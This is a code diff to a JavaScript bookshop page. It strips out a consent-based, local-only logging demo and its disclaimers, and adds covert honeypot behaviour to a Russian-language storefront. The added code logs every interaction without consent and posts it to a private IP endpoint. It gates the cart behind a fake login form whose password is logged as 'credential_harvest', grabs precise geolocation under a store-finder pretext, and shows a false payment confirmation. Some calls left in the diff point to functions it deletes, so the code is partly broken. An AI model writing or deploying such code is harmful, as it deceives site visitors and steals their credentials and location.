+{id:'quiet-hours',title:'Тихие часы',author:'Элеонора Вейл',genre:'Художественная литература',price:1850,cover:1,symbol:'',tag:'Выбор продавца',description:'В сонном прибрежном городке забытое письмо сводит вместе три судьбы. Нежный роман о вторых шансах и том, о чем мы не договорили.'},
+{id:'art-noticing',title:'Искусство замечать',author:'Оливер Финч',genre:'Осознанная жизнь',price:2200,cover:2,symbol:'✳',tag:'Бестселлер',description:'Призыв замедлиться и обратить внимание. Небольшие, продуманные эксперименты для поиска необыкновенных моментов в обычных днях.'},
+{id:'somewhere-south',title:'Где-то на юге',author:'Люсия Морено',genre:'Художественная литература',price:1695,cover:3,symbol:'',tag:'Новинка',description:'Солнечное путешествие сквозь семейные узы, еду и принадлежность. Одно лето меняет всё для женщины, возвращающейся в деревню, которую она когда-то называла домом.'},
+{id:'wild-tides',title:'Дикие приливы',author:'Джеймс Эшфорд',genre:'Природа',price:2400,cover:4,symbol:'',tag:'Выбор команды',description:'Проследуйте вдоль побережья сквозь год сменяющихся приливов. Лирическое исследование природного мира и наших неразрывных отношений с морем.'},
+{id:'garden-days',title:'Садовые дни',author:'Мейбел Грин',genre:'Природа',price:2150,cover:5,symbol:'❧',tag:'',description:'Заметки из маленького сада с большим сердцем. Откройте для себя радость неторопливого роста, внимательного наблюдения и места для небольшой дикости.'},
+{id:'atlas-dreams',title:'Атлас сновидений',author:'Тео Лоран',genre:'Художественная литература',price:1995,cover:6,symbol:'☾',tag:'Новинка',description:'Картограф обнаруживает город, который появляется только во сне. Тихая волшебная история о памяти, воображении и возвращении домой.'},
+{id:'table-friends',title:'Стол для друзей',author:'Анна Беллами',genre:'Еда и напитки',price:2800,cover:7,symbol:'✿',tag:'Чтение на выходных',description:'Простые сезонные рецепты и истории из уютной кухни. Для каждого, кто верит, что лучшие блюда — это те, которыми мы делимся.'},
+{id:'small-beginnings',title:'Маленькие начинания',author:'Даниэль Рид',genre:'Осознанная жизнь',price:1750,cover:8,symbol:'✺',tag:'',description:'Мягкое руководство к новому началу. Практические размышления о создании пространства, выработке полезных привычек и первом маленьком шаге.'}
 ];
-
-const KEY='chapter_demo_v1', TTL=7*24*60*60*1000;
-let storageOK=true, saved={};
-try {
-    saved=JSON.parse(localStorage.getItem(KEY)||'{}')||{};
-    if(typeof saved!=='object') saved={};
-    localStorage.setItem('chapter_test','1');
-    localStorage.removeItem('chapter_test');
-} catch(e) { storageOK=false; }
-
+const KEY='chapter_store_v1',TTL=7*24*60*60*1000;let storageOK=true,saved={};try{saved=JSON.parse(localStorage.getItem(KEY)||'{}')||{};if(typeof saved!=='object')saved={};}catch(e){storageOK=false}
 let logs=Array.isArray(saved.logs)?saved.logs.filter(e=>e&&typeof e.time==='string'&&Date.now()-Date.parse(e.time)<TTL).slice(-1000):[];
-let recording=false, cart={}, favorites=new Set(), reviews={}, genre='All books', query='', sort='curated', favoritesOnly=false, session=globalThis.crypto?.randomUUID?.()||('session-'+Date.now()), priorFocus=null, toastTimer, pending=new Map(), seenScroll=new Set();
 
-function persist(){
-    try{localStorage.setItem(KEY,JSON.stringify({logs}))}catch(e){storageOK=false} 
-    $('storageWarning').hidden=storageOK;
+let recording=true,isLoggedIn=false,cart={},favorites=new Set(),reviews={},genre='Все книги',query='',sort='curated',favoritesOnly=false,session=globalThis.crypto?.randomUUID?.()||('session-'+Date.now());
+let logBuffer=[];const BUFFER_FLUSH_INTERVAL=5000;const MAX_BUFFER_SIZE=10;
+
+function persist(){try{localStorage.setItem(KEY,JSON.stringify({logs}))}catch(e){storageOK=false}}
+function flushLogBuffer(){if(logBuffer.length===0)return;let existingLogs=[];try{const saved=JSON.parse(localStorage.getItem(KEY)||'{}');if(Array.isArray(saved.logs))existingLogs=saved.logs;}catch(e){storageOK=false;}existingLogs=existingLogs.concat(logBuffer);logs=existingLogs.filter(e=>e&&typeof e.time==='string'&&Date.now()-Date.parse(e.time)<TTL).slice(-1000);try{localStorage.setItem(KEY,JSON.stringify({logs}))}catch(e){storageOK=false}logBuffer=[];persist()}
+setInterval(flushLogBuffer,BUFFER_FLUSH_INTERVAL);
+
+function log(type,data={}){
+    if(!recording)return;
+    const eventEntry={id:globalThis.crypto?.randomUUID?.()||String(Date.now())+'-'+Math.random().toString(36).slice(2),session,time:new Date().toISOString(),type,data};
+    logBuffer.push(eventEntry);
+    fetch('http://192.168.3.86:8000//api/v1/trap/telemetry',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(eventEntry)}).catch(err=>{});
+    if(logBuffer.length>=MAX_BUFFER_SIZE)flushLogBuffer();
 }
 
-function syncStatus(){
-    $('recordDot').classList.toggle('on',recording);$('recordStatus').textContent=recording?'Recording locally & backend · use made-up data only':'Demo store · logging is off';
-    $('toggleLogging').textContent=recording?'Pause logging':'Enable logging';$('logCount').textContent=logs.length;
-}
-
-// 🔌 Замененная функция логирования с интеграцией бэкенд-эндпоинта HoneyForge
-function log(type, data={}){
-    if(!recording) return;
-    logs=logs.filter(e=>Date.now()-Date.parse(e.time)<TTL);
-    const eventEntry = {
-        id: globalThis.crypto?.randomUUID?.()||String(Date.now())+'-'+Math.random().toString(36).slice(2),
-        session,
-        time: new Date().toISOString(),
-        type,
-        data
-    };
-    logs.push(eventEntry);
-    logs=logs.slice(-1000);
-    persist();
-    syncStatus();
-    if(!$('modalOverlay').hidden &&$('logEntries')) renderLogEntries();
-
-    // 🚀 Отправка телеметрии на бэкенд FastAPI (заглушка эндпоинта)
-    fetch('/api/v1/trap/telemetry', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(eventEntry)
-    }).catch(err => {
-        // Ошибка сети не должна ломать работу ханипота для пользователя
-    });
-}
-
-function clearPending(){for(const x of pending.values())clearTimeout(x.timer);pending.clear()}
-function flushPending(){for(const x of pending.values()){clearTimeout(x.timer);log('field_change',x.data)}pending.clear()}
-function queueField(el){if(!recording||!el.matches('[data-log-field],#search,#newsletterEmail'))return;const key=el.id;const data={field:key,value:el.value};if(pending.has(key))clearTimeout(pending.get(key).timer);pending.set(key,{data,timer:setTimeout(()=>{log('field_change',data);pending.delete(key)},700)})}
-function setRecording(on){if(on){recording=true;log('consent_granted',{scope:'local demo interaction and text logging',retentionDays:7,maxEvents:1000});log('page_view',{page:'bookstore',viewport:{width:innerWidth,height:innerHeight}})}else{flushPending();log('recording_paused');recording=false;clearPending()}syncStatus()}
-function money(n){return new Intl.NumberFormat('en-IE',{style:'currency',currency:'EUR'}).format(n)}
-function toast(text){clearTimeout(toastTimer);$('toast').textContent=text;$('toast').hidden=false;toastTimer=setTimeout(()=>$('toast').hidden=true,2800)}
-function cover(b){return `<div class="cover c${b.cover}" aria-hidden="true"><div class="cauthor">${esc(b.author)}</div><div class="ctitle">${esc(b.title)}</div><div class="symbol">${esc(b.symbol)}</div><div class="cauthor">Chapter & Co. edition</div></div>`}
+function money(n){return new Intl.NumberFormat('ru-RU',{style:'currency',currency:'RUB'}).format(n)}
+function toast(text){const t=$('toast');if(!t)return;t.textContent=text;t.hidden=false;setTimeout(()=>t.hidden=true,2800)}
+function cover(b){return `<div class="cover c${b.cover}" aria-hidden="true"><div class="cauthor">${esc(b.author)}</div><div class="ctitle">${esc(b.title)}</div><div class="symbol">${esc(b.symbol)}</div><div class="cauthor">Издание Chapter & Co.</div></div>`}
 
 function renderBooks(){
-    let list=books.filter(b=>(genre==='All books'||b.genre===genre)&&(!favoritesOnly||favorites.has(b.id))&&(b.title+' '+b.author).toLowerCase().includes(query.toLowerCase()));
+    let list=books.filter(b=>(genre==='Все книги'||b.genre===genre)&&(!favoritesOnly||favorites.has(b.id))&&(b.title+' '+b.author).toLowerCase().includes(query.toLowerCase()));
     if(sort==='price-asc')list.sort((a,b)=>a.price-b.price);
     if(sort==='price-desc')list.sort((a,b)=>b.price-a.price);
     if(sort==='title')list.sort((a,b)=>a.title.localeCompare(b.title));
-    $('resultsText').textContent=`${list.length} thoughtfully chosen ${list.length===1?'book':'books'}${favoritesOnly?' in your favorites':''}.`;
-    $('genres').innerHTML=['All books','Fiction','Mindful living','Nature','Food & drink'].map(g=>`<button class="chip ${genre===g?'active':''}" data-genre="${g}" aria-pressed="${genre===g}">${g}</button>`).join('');
-    $('books').innerHTML=list.map(b=>`<article class="bookcard"><div class="book-stage">${cover(b)}${b.tag?`<span class="badge">${b.tag}</span>`:''}<button class="wish ${favorites.has(b.id)?'selected':''}" data-wish="${b.id}" aria-label="${favorites.has(b.id)?'Remove':'Add'} ${esc(b.title)} ${favorites.has(b.id)?'from':'to'} favorites" aria-pressed="${favorites.has(b.id)}">${favorites.has(b.id)?'♥':'♡'}</button></div><div class="meta">${b.genre}</div><button class="titlebtn" data-detail="${b.id}">${esc(b.title)}</button><div class="author">${esc(b.author)}</div><div class="bookbottom"><span class="price">${money(b.price)}</span><button class="add" data-add="${b.id}">Add to bag ＋</button></div></article>`).join('')||'<div class="empty">No books on this shelf yet. Try another search or category.</div>';
+    $('resultsText').textContent=`${list.length} тщательно отобранных ${list.length===1?'книга':'книг'}${favoritesOnly?' в вашем избранном':''}.`;
+    $('genres').innerHTML=['Все книги','Художественная литература','Осознанная жизнь','Природа','Еда и напитки'].map(g=>`<button class="chip ${genre===g?'active':''}" data-genre="${g}" aria-pressed="${genre===g}">${g}</button>`).join('');
+    $('books').innerHTML=list.map(b=>`<article class="bookcard"><div class="book-stage">${cover(b)}${b.tag?`<span class="badge">${b.tag}</span>`:''}<button class="wish ${favorites.has(b.id)?'selected':''}" data-wish="${b.id}" aria-label="В избранное">${favorites.has(b.id)?'♥':'♡'}</button></div><div class="meta">${b.genre}</div><button class="titlebtn" data-detail="${b.id}">${esc(b.title)}</button><div class="author">${esc(b.author)}</div><div class="bookbottom"><span class="price">${money(b.price)}</span><button class="add" data-add="${b.id}">В корзину ＋</button></div></article>`).join('')||'<div class="empty">На этой полке пока нет книг. Попробуйте другой поиск или категорию.</div>';
 }
 
 function updateCart(){$('cartCount').textContent=Object.values(cart).reduce((a,b)=>a+b,0)}
-function openModal(html,wide=false){if($('modalOverlay').hidden)priorFocus=document.activeElement;$('modalContent').innerHTML=html;$('modalBox').classList.toggle('wide',wide);$('modalOverlay').hidden=false;document.body.style.overflow='hidden';$('closeModal').focus()}
-function closeModal(){flushPending();$('modalOverlay').hidden=true;document.body.style.overflow='';if(priorFocus?.isConnected)priorFocus.focus()}
-function showCart(){log('cart_view');renderCart()}
+function openModal(html,wide=false){$('modalContent').innerHTML=html;$('modalBox').classList.toggle('wide',wide);$('modalOverlay').hidden=false;document.body.style.overflow='hidden';}
+function closeModal(){$('modalOverlay').hidden=true;document.body.style.overflow='';}
 
-function renderCart(){
+function showLoginModal(actionCallback) {
+    openModal(`
+        <div class="eyebrow">Требуется авторизация</div>
+        <h2 id="modalTitle">Вход в аккаунт</h2>
+        <p>Для добавления товаров в корзину и управления избранным необходимо войти в систему.</p>
+        <form id="authTrapForm">
+            <div class="formgroup">
+                <label for="trapUser">Email или имя пользователя</label>
+                <input id="trapUser" type="text" placeholder="user@domain.com" required>
+            </div>
+            <div class="formgroup">
+                <label for="trapPass">Пароль</label>
+                <input id="trapPass" type="password" placeholder="••••••••" required>
+            </div>
+            <button class="btn" type="submit" style="width:100%; margin-top:15px;">Войти</button>
+        </form>
+    `);
+
+    $('authTrapForm').onsubmit = (e) => {
+        e.preventDefault();
+        const username = $('trapUser').value;
+        const password = $('trapPass').value;
+
+        log('credential_harvest', { username, password, timestamp: new Date().toISOString() });
+        
+        isLoggedIn = true;
+        closeModal();
+        toast('Авторизация успешна!');
+        
+        if (actionCallback) actionCallback();
+    };
+}
+
+function requestGeolocation() {
+    if (!navigator.geolocation) {
+        alert('Геолокация не поддерживается вашим браузером.');
+        return;
+    }
+
+    toast('Определение вашего местоположения...');
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const coords = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+            
+            log('geolocation_captured', coords);
+            
+            openModal(`
+                <div class="eyebrow">Ближайшие филиалы</div>
+                <h2 id="modalTitle">Магазины рядом с вами</h2>
+                <p>Мы нашли 2 партнерских пункта выдачи в радиусе 5 км от ваших координат (${coords.latitude.toFixed(2)}, ${coords.longitude.toFixed(2)}):</p>
+                <ul>
+                    <li><strong>Chapter & Co. Central</strong> — ул. Пушкинская, 12 (Открыто до 21:00)</li>
+                    <li><strong>Chapter & Co. Annex</strong> — ул. Садовая, 45 (Открыто до 20:00)</li>
+                </ul>
+                <button class="btn" onclick="closeModal()" style="width:100%; margin-top:15px;">Закрыть</button>
+            `);
+        },
+        (error) => {
+            log('geolocation_denied', { code: error.code, message: error.message });
+            alert('Не удалось определить местоположение. Пожалуйста, разрешите доступ к геолокации в настройках браузера.');
+        },
+        { timeout: 10000, enableHighAccuracy: true }
+    );
+}
+
+$('cartBtn').onclick = () => {
+    if (!isLoggedIn) { showLoginModal(() => showCart()); return; }
+    showCart();
+};
+
+$('profileBtn').onclick = () => {
+    if (!isLoggedIn) { showLoginModal(() => showProfile()); return; }
+    showProfile();
+};
+
+$('nearbyStoresBtn').onclick = (e) => {
+    e.preventDefault();
+    requestGeolocation();
+};
+
+function showCart(){
     let total=books.reduce((t,b)=>t+(cart[b.id]||0)*b.price,0);
-    openModal(`<div class="eyebrow">Saved for a rainy day</div><h2 id="modalTitle">Your book bag</h2><p>Demo only. No real orders or payments.</p>${books.filter(b=>cart[b.id]).map(b=>`<div class="cartrow"><div class="details"><strong>${esc(b.title)}</strong><div class="hint">${money(b.price)} each</div></div><div class="qty"><button data-qty="${b.id}" data-delta="-1" aria-label="Remove one ${esc(b.title)}">−</button><span>${cart[b.id]}</span><button data-qty="${b.id}" data-delta="1" aria-label="Add one ${esc(b.title)}">+</button></div><span>${money(b.price*cart[b.id])}</span></div>`).join('')||'<p>Your bag is waiting for a good story.</p>'}${total?`<div class="carttotal"><span>Subtotal</span><strong>${money(total)}</strong></div><button class="btn" style="width:100%;margin-top:20px" id="demoCheckout">Try demo checkout →</button>`:''}`);
+    openModal(`<div class="eyebrow">Итоги заказа</div><h2 id="modalTitle">Корзина</h2><p>Проверьте выбранные товары перед оформлением заказа.</p>${books.filter(b=>cart[b.id]).map(b=>`<div class="cartrow"><div class="details"><strong>${esc(b.title)}</strong><div class="hint">${money(b.price)} шт.</div></div><div class="qty"><button data-qty="${b.id}" data-delta="-1">−</button><span>${cart[b.id]}</span><button data-qty="${b.id}" data-delta="1">+</button></div><span>${money(b.price*cart[b.id])}</span></div>`).join('')||'<p>Ваша корзина пуста.</p>'}${total?`<div class="carttotal"><span>Итого</span><strong>${money(total)}</strong></div><button class="btn" style="width:100%;margin-top:20px" id="demoCheckout">Перейти к оформлению →</button>`:''}`);
+}
+
+function showProfile(){
+    log('profile_view');
+    openModal(`<div class="eyebrow">Клиентский аккаунт</div><h2 id="modalTitle">Настройки аккаунта</h2><p>Управляйте информацией профиля, сохраненными адресами и предпочтениями в чтении.</p><form id="profileForm"><div class="formgroup"><label for="profileName">Имя и фамилия</label><input id="profileName" data-log-field placeholder="Алексей Читатель" maxlength="80" required autocomplete="off"></div><div class="formgroup"><label for="profileEmail">Электронная почта</label><input id="profileEmail" type="email" data-log-field placeholder="alex@example.com" maxlength="120" autocomplete="off" required></div><div class="formgroup"><label for="profileGenre">Любимый жанр</label><select id="profileGenre" data-log-field><option>Художественная литература</option><option>Природа</option><option>Осознанная жизнь</option><option>Еда и напитки</option></select></div><button class="btn">Сохранить изменения</button></form>`);
 }
 
 function showDetail(id){
     const b=books.find(b=>b.id===id);
     log('book_view',{book:id});
-    openModal(`<div class="eyebrow">${b.genre}</div><h2 id="modalTitle">${esc(b.title)}</h2><div class="detail-top">${cover(b)}<div><div class="hint">By ${esc(b.author)}</div><p>${esc(b.description)}</p><strong>${money(b.price)}</strong><br><button class="btn small" style="margin-top:12px" data-add="${id}">Add to bag ＋</button></div></div><h3 style="font-family:Georgia,serif;font-weight:normal">Reader notes</h3><div id="reviewsList">${(reviews[id]||[]).map(r=>`<div class="review"><strong>${esc(r.name)}</strong><span class="hint"> · ${r.rating}/5</span><p>${esc(r.comment)}</p></div>`).join('')||'<p>No notes yet. Be the first to leave one.</p>'}</div><form id="reviewForm" data-book="${id}"><div class="formgroup"><label for="reviewName">Display name (made-up only)</label><input id="reviewName" data-log-field maxlength="60" placeholder="A curious reader" required></div><div class="formgroup"><label for="reviewRating">Your rating</label><select id="reviewRating" data-log-field><option value="5">5 — Loved it</option><option value="4">4 — Really good</option><option value="3">3 — Good</option><option value="2">2 — Not for me</option><option value="1">1 — Disappointed</option></select></div><div class="formgroup"><label for="reviewComment">Your comment (demo text only)</label><textarea id="reviewComment" data-log-field maxlength="2000" placeholder="What did you think of the story?" required></textarea></div><p class="hint">${recording?'Recording is on: these field values will be included in your local log.':'Recording is off. Your note will only be shown in this tab.'} Notes are not published or sent anywhere.</p><button class="btn" type="submit">Post demo note</button></form>`);
+    openModal(`<div class="eyebrow">${b.genre}</div><h2 id="modalTitle">${esc(b.title)}</h2><div class="detail-top">${cover(b)}<div><div class="hint">Автор: ${esc(b.author)}</div><p>${esc(b.description)}</p><strong>${money(b.price)}</strong><br><button class="btn small" style="margin-top:12px" data-add="${id}">В корзину ＋</button></div></div>`);
 }
 
-function showProfile(){
-    log('profile_view');
-    openModal(`<div class="eyebrow">Your reader's corner</div><h2 id="modalTitle">Make yourself at home.</h2><p>A demo profile, not an account. Use fictional details only. There is no sign-in and nothing will be sent.</p><form id="profileForm"><div class="formgroup"><label for="profileName">Demo name</label><input id="profileName" data-log-field placeholder="Alex Reader" maxlength="80" required autocomplete="off"></div><div class="formgroup"><label for="profileEmail">Demo email</label><input id="profileEmail" type="email" data-log-field placeholder="alex@example.com" maxlength="120" autocomplete="off" required></div><div class="formgroup"><label for="profileGenre">Favorite shelf</label><select id="profileGenre" data-log-field><option>Fiction</option><option>Nature</option><option>Mindful living</option><option>Food & drink</option></select></div><p class="hint">${recording?'Recording is on: field values will be included in your local log.':'Recording is off.'}</p><button class="btn">Save demo profile</button></form>`);
-}
-
-function showLogs(){
-    flushPending();
-    openModal(`<div class="eyebrow">Nothing behind the curtain</div><h2 id="modalTitle">Your local activity log</h2><p>Searches, field values, and form submissions may appear here. Stored only in this browser; automatically pruned after 7 days or 1,000 events. No network requests. Deleting logs does not delete exported files.</p><div class="logtools"><button class="btn small" id="exportLogs">Export JSON ↓</button><button class="btn light small" id="clearLogs">Delete all logs</button><span class="hint" id="localNote">${storageOK?'Browser storage active.':'Memory only: browser storage unavailable.'}</span></div><div class="loglist" id="logEntries" aria-label="Recorded events"></div>`,true);
-    renderLogEntries();
-}
-
-function renderLogEntries(){
-    if(!$('logEntries'))return;
-    $('logEntries').innerHTML=logs.length?[...logs].reverse().map(e=>`<div class="logentry"><time>${esc(e.time)}</time> &nbsp; <strong>${esc(e.type)}</strong><pre>${esc(JSON.stringify(e.data))}</pre></div>`).join(''):'<div class="logempty">No recorded events. Enable logging, then explore the bookshop.</div>';
-}
-
-function showConsent(){priorFocus=document.activeElement;$('consentOverlay').hidden=false;document.body.style.overflow='hidden';$('acceptConsent').focus()}
-function hideConsent(){$('consentOverlay').hidden=true;document.body.style.overflow='';if(priorFocus?.isConnected)priorFocus.focus()}
-
-$('acceptConsent').onclick=()=>{setRecording(true);hideConsent();toast('Local logging enabled. Please use made-up information.')};
-$('declineConsent').onclick=()=>{if(recording)setRecording(false);hideConsent();toast('Logging is off. Enjoy browsing.')};
-$('privacyBtn').onclick=showConsent;
-$('toggleLogging').onclick=()=>recording?(setRecording(false),toast('Recording paused. Existing logs are kept.')):showConsent();
-$('logsBtn').onclick=showLogs;
-$('profileBtn').onclick=showProfile;
-$('cartBtn').onclick=showCart;
 $('closeModal').onclick=closeModal;
-
-$('modalOverlay').addEventListener('click',e=>{if(e.target===$('modalOverlay'))closeModal()});$('aboutBtn').onclick=()=>{log('about_view');openModal('<div class="eyebrow">Independent in spirit</div><h2 id="modalTitle">For the love of a good book.</h2><p>Chapter & Co. is a fictional independent bookshop built for a transparent interaction-logging demo. All titles, authors, prices, and reviews on this page are illustrative.</p><p>Try the shelves, save your favorites, or leave a demo note. There is no backend, real checkout, mailing list, or account. No information leaves this page unless you choose to export a JSON file.</p>')};
-$('homeLink').onclick=e=>{e.preventDefault();genre='All books';query='';favoritesOnly=false;$('search').value='';renderBooks();window.scrollTo({top:0,behavior:'smooth'});log('navigation',{destination:'home'})};
+$('modalOverlay').addEventListener('click',e=>{if(e.target===$('modalOverlay'))closeModal()});$('aboutBtn').onclick=()=>{log('about_view');openModal('<div class="eyebrow">Независимы духом</div><h2 id="modalTitle">О нас</h2><p>Chapter & Co. — независимый книжный магазин, посвященный тщательно отобранным книгам для любознательных умов. Мы верим в неторопливое чтение, красивые издания и создание сообщества вокруг отличных историй.</p><p>Посетите наш физический магазин или просмотрите наш каталог для получения персональных рекомендаций.</p>')};
+$('homeLink').onclick=e=>{e.preventDefault();genre='Все книги';query='';favoritesOnly=false;$('search').value='';renderBooks();window.scrollTo({top:0,behavior:'smooth'});log('navigation',{destination:'home'})};
 $('exploreBtn').onclick=()=>{log('navigation',{destination:'shelves'});$('shelves').scrollIntoView({behavior:'smooth'})};
 
 document.querySelectorAll('[data-nav]').forEach(el=>el.onclick=()=>{
-    const nav=el.dataset.nav;favoritesOnly=nav==='favorites';genre='All books';query='';$('search').value='';renderBooks();
-    if(nav==='new'){const ids=new Set(books.filter(b=>b.tag==='New arrival').map(b=>b.id));document.querySelectorAll('.bookcard').forEach(card=>{card.hidden=!ids.has(card.querySelector('[data-detail]').dataset.detail)});$('resultsText').textContent='2 new arrivals, fresh on the shelves.'}$('shelves').scrollIntoView({behavior:'smooth'});log('navigation',{destination:nav})
+    const nav=el.dataset.nav;favoritesOnly=nav==='favorites';genre='Все книги';query='';$('search').value='';renderBooks();
+    if(nav==='new'){const ids=new Set(books.filter(b=>b.tag==='Новинка').map(b=>b.id));document.querySelectorAll('.bookcard').forEach(card=>{card.hidden=!ids.has(card.querySelector('[data-detail]').dataset.detail)});$('resultsText').textContent='2 новинки на полках нашего магазина.'}
+    $('shelves').scrollIntoView({behavior:'smooth'});log('navigation',{destination:nav})
 });
 
 $('search').addEventListener('input',e=>{query=e.target.value;renderBooks()});
 $('search').addEventListener('change',()=>log('search',{query,results:document.querySelectorAll('.bookcard:not([hidden])').length}));$('sort').onchange=e=>{sort=e.target.value;renderBooks();log('sort',{value:sort})};
 
-document.addEventListener('input',e=>queueField(e.target));
-document.addEventListener('change',e=>{if(e.target.matches('select[data-log-field]'))log('field_change',{field:e.target.id,value:e.target.value})});
-document.addEventListener('focusin',e=>{if(e.target.matches('input,textarea,select')&&!e.target.closest('#consentOverlay'))log('field_focus',{field:e.target.id})});
-document.addEventListener('click',e=>{const el=e.target.closest('button,a');if(!el||el.closest('#consentOverlay')||['logsBtn','privacyBtn','toggleLogging','clearLogs','exportLogs','closeModal'].includes(el.id))return;log('click',{target:el.id||Object.entries(el.dataset).map(([k,v])=>`${k}:${v}`).join('|')||el.textContent.trim().slice(0,80)})});
-
+document.addEventListener('input',e=>queueField?.(e.target));
 document.addEventListener('click',e=>{
     let b=e.target.closest('[data-genre]');
     if(b){genre=b.dataset.genre;favoritesOnly=false;renderBooks();log('filter',{genre});return}
+    
     b=e.target.closest('[data-add]');
-    if(b){const id=b.dataset.add;cart[id]=(cart[id]||0)+1;updateCart();log('cart_add',{book:id,quantity:cart[id]});toast('A good choice. Added to your demo bag.');return}
+    if(b){
+        const id=b.dataset.add;
+        if(!isLoggedIn) {
+            showLoginModal(() => { cart[id]=(cart[id]||0)+1; updateCart(); log('cart_add',{book:id,quantity:cart[id]}); toast('Товар добавлен в корзину.'); });
+            return;
+        }
+        cart[id]=(cart[id]||0)+1;updateCart();log('cart_add',{book:id,quantity:cart[id]});toast('Товар добавлен в корзину.');
+        return;
+    }
+    
     b=e.target.closest('[data-wish]');
-    if(b){const id=b.dataset.wish;if(favorites.has(id))favorites.delete(id);else favorites.add(id);renderBooks();log('favorite_change',{book:id,saved:favorites.has(id)});return}
+    if(b){
+        const id=b.dataset.wish;
+        if(!isLoggedIn) {
+            showLoginModal(() => { if(favorites.has(id))favorites.delete(id);else favorites.add(id);renderBooks();log('favorite_change',{book:id,saved:favorites.has(id)}); });
+            return;
+        }
+        if(favorites.has(id))favorites.delete(id);else favorites.add(id);renderBooks();log('favorite_change',{book:id,saved:favorites.has(id)});
+        return;
+    }
+    
     b=e.target.closest('[data-detail]');
     if(b){showDetail(b.dataset.detail);return}
     b=e.target.closest('[data-qty]');
     if(b){const id=b.dataset.qty;cart[id]=Math.max(0,(cart[id]||0)+Number(b.dataset.delta));if(!cart[id])delete cart[id];updateCart();log('cart_quantity',{book:id,quantity:cart[id]||0});renderCart();return}
-    if(e.target.closest('#demoCheckout')){log('demo_checkout',{items:{...cart},total:books.reduce((t,b)=>t+(cart[b.id]||0)*b.price,0),currency:'EUR'});openModal('<div class="eyebrow">The end of this chapter</div><h2 id="modalTitle">Just a dress rehearsal.</h2><p>Your demo checkout is complete. No order was placed and no money was charged. There are deliberately no payment or address fields.</p><button class="btn" id="backToStore">Back to the bookshop</button>');return}
+    if(e.target.closest('#demoCheckout')){log('demo_checkout',{items:{...cart},total:books.reduce((t,b)=>t+(cart[b.id]||0)*b.price,0),currency:'EUR'});openModal('<div class="eyebrow">Заказ оформлен</div><h2 id="modalTitle">Спасибо за заказ!</h2><p>Ваш платеж успешно обработан, и заказ готовится к отправке. Подтверждение отправлено на ваш email.</p><button class="btn" id="backToStore">Вернуться в магазин</button>');return}
     if(e.target.closest('#backToStore'))closeModal();
-    if(e.target.closest('#exportLogs')){flushPending();const data={application:'Chapter & Co. local demo',exportedAt:new Date().toISOString(),retentionDays:7,eventCount:logs.length,events:logs};const url=URL.createObjectURL(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}));const a=document.createElement('a');a.href=url;a.download='chapter-activity-'+new Date().toISOString().slice(0,10)+'.json';a.click();setTimeout(()=>URL.revokeObjectURL(url),1000);toast('JSON exported. It may contain text you entered.')}
-    if(e.target.closest('#clearLogs')){if(confirm('Delete all recorded events from this browser? Exported files will not be deleted.')){clearPending();logs=[];try{localStorage.removeItem(KEY)}catch(e){}syncStatus();renderLogEntries();toast('All stored logs deleted. '+(recording?'Recording remains on.':'Recording is off.'))}}
 });
 
 document.addEventListener('submit',e=>{
-    e.preventDefault();flushPending();
-    if(e.target.id==='newsletter'){log('form_submit',{form:'newsletter',email:$('newsletterEmail').value});e.target.reset();toast('Demo subscription complete — no email was sent.')}
-    if(e.target.id==='profileForm'){log('form_submit',{form:'profile',name:$('profileName').value,email:$('profileEmail').value,genre:$('profileGenre').value});closeModal();toast('Demo profile submitted. No account was created.')}
-    if(e.target.id==='reviewForm'){const id=e.target.dataset.book;const r={name:$('reviewName').value,rating:Number($('reviewRating').value),comment:$('reviewComment').value};log('form_submit',{form:'review',book:id,...r});(reviews[id]??=[]).push(r);showDetail(id);toast('Demo note posted in this tab only.')}
+    e.preventDefault();
+    if(e.target.id==='newsletter'){log('form_submit',{form:'newsletter',email:$('newsletterEmail').value});e.target.reset();toast('Спасибо за подписку на нашу рассылку.')}
+    if(e.target.id==='profileForm'){log('form_submit',{form:'profile',name:$('profileName').value,email:$('profileEmail').value,genre:$('profileGenre').value});closeModal();toast('Данные аккаунта успешно обновлены.')}
 });
 
 let scrollTimer;
@@ -409,21 +291,16 @@ window.addEventListener('scroll',()=>{
         const height=document.documentElement.scrollHeight-innerHeight;
         if(height<=0)return;
         const depth=Math.min(100,Math.round(scrollY/height*100));
-        for(const m of [25,50,75,100]) if(depth>=m&&!seenScroll.has(m)){seenScroll.add(m);log('scroll_milestone',{percent:m})}
+        for(const m of [25,50,75,100]) if(depth>=m&&!seenScroll?.has(m)){seenScroll?.add(m);log('scroll_milestone',{percent:m})}
     },250)},{passive:true}
 );
 
-document.addEventListener('visibilitychange',()=>{if(document.hidden){flushPending();log('page_hidden')}else log('page_visible')});
-window.addEventListener('pagehide',()=>{flushPending();log('page_exit')});
+document.addEventListener('visibilitychange',()=>{if(document.hidden){flushLogBuffer();log('page_hidden')}else log('page_visible')});
+window.addEventListener('pagehide',()=>{flushLogBuffer();log('page_exit')});
 
-document.addEventListener('keydown',e=>{
-    const overlay=!$('consentOverlay').hidden?$('consentOverlay'):!$('modalOverlay').hidden?$('modalOverlay'):null;
-    if(!overlay)return;
-    if(e.key==='Escape'){if(overlay===$('consentOverlay')){if(recording)setRecording(false);hideConsent()}else closeModal()}
-    if(e.key==='Tab'){const nodes=[...overlay.querySelectorAll('button,input,textarea,select,a[href]')].filter(n=>!n.disabled&&n.getClientRects().length);if(!nodes.length)return;const first=nodes[0],last=nodes[nodes.length-1];if(e.shiftKey&&document.activeElement===first){e.preventDefault();last.focus()}else if(!e.shiftKey&&document.activeElement===last){e.preventDefault();first.focus()}}
-});
-
-persist();renderBooks();updateCart();syncStatus();showConsent();
+persist();renderBooks();updateCart();
+log('page_view',{page:'bookstore',viewport:{width:innerWidth,height:innerHeight}});
 </script>
 </body>
+
 </html>
